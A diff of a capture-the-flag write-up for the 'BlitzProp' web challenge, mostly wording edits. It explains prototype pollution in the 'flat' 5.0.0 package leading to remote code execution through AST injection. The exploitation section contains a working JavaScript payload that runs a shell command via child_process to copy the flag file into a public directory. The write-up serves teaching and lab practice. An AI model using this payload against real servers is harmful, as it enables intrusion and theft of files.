@@ -6,15 +6,14 @@ tags: [cyberapocalpyse2021]
 toc: false
 ---
 
-# BlitzProp
-This challenge contained a Prototype Pollution to RCE via AST Injection.<br>You can read more about it in this [blog](https://blog.p6.is/AST-Injection/) post
+This challenge contained a Prototype Pollution to RCE via AST Injection. You can read more about it in this great [blog](https://blog.p6.is/AST-Injection/) post. (\* ^ ω ^)
 
-The webpage looks as follows:
+The webpage looks like this:
 ![](/assets/img/blitzProb_web.png#center)
 
 
 ## Vulnerability
-While going trough the source code we can see in the "challenge/routes/index.js" file, the "unflatten" function which is called after receiving a post request:
+Going through the source code, we can see in the file "challenge/routes/index.js" that the function "unflatten" is called after receiving a post request:
 
 ``` javascript
 const path              = require('path');
@@ -44,10 +43,10 @@ router.post('/api/submit', (req, res) => {
 module.exports = router;
 ```
 
-After reviewing the "package.json" file we can see that "flat" “5.0.0” is installed which suffers from a Prototype Pollution vulnerability via Abstract Syntax Tree. [Here](https://github.com/hughsk/flat/issues/105) you can find the PoC.
+After reviewing the "package.json" file we can see that "flat" “5.0.0” is installed, which suffers from a Prototype Pollution vulnerability via Abstract Syntax Tree. [Here](https://github.com/hughsk/flat/issues/105) you can find the PoC.
 
 ## Exploitation
-To exploit this vulnerability and read the flag, we just open the web console and sent the below payload to "/api/submit":
+To exploit this vulnerability and read the flag, we simply open the web console and send the payload below to "/api/submit":
 
 ```javascript
 let CMD = "process.mainModule.require('child_process').execSync('cat /app/flag* >> /app/static/js/flag.txt')"
@@ -67,6 +66,8 @@ fetch('/api/submit', {
 })
 ```
 
-The flag file was written in webserver’s static directory. After visiting /static/js/flag.txt we see the flag:
+The flag file has been written to the static directory of the web server. After visiting /static/js/flag.txt we see the flag:
 
 > CHTB{p0llute_with_styl3}
+
+٩(◕‿◕｡)۶
